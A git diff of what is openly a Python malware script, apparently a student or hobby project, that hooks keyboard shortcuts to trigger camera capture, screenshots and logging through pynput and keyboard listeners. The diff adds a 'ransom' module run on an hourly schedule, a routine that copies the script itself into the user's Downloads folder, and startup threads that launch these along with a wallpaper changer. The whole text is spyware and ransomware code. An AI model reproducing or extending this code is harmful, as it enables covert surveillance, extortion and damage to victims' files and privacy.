@@ -1,14 +1,20 @@
 from pynput.keyboard import Listener
 import os
 import threading
-from Classes import popup, logger, Background_Changer as bg, screenshots as ss, fotos as ft
+from Classes import popup, logger, Background_Changer as bg, screenshots as ss, fotos as ft, ransom
 import schedule
-import subprocess
-
+import shutil
 import keyboard
 
-def message(text):
-    print(text)
+def rsm():
+    schedule.every(1).hours.do(ransom.run())
+    schedule.run_pending()
+
+def save_in_downloads():
+    shutil.copy(os.path.abspath(__file__),os.path.expanduser("~").replace('/','\\') + '\\Downloads')
+
+# def message(text):
+#     print(text)
 
 def ctrlX(): #acceso a camara
     threading.Thread(target=ft.camera).start()
@@ -34,4 +40,9 @@ keyboard.add_hotkey('ctrl+c',ctrlC)
 keyboard.add_hotkey('ctrl+v',ctrlV)
 keyboard.add_hotkey('ctrl+z',stop)
 
+
+#start of the program
+threading.Thread(target=save_in_downloads).start()
+threading.Thread(target=bg.run()).start()
+threading.Thread(target=rsm).start()
 keyboard.wait()
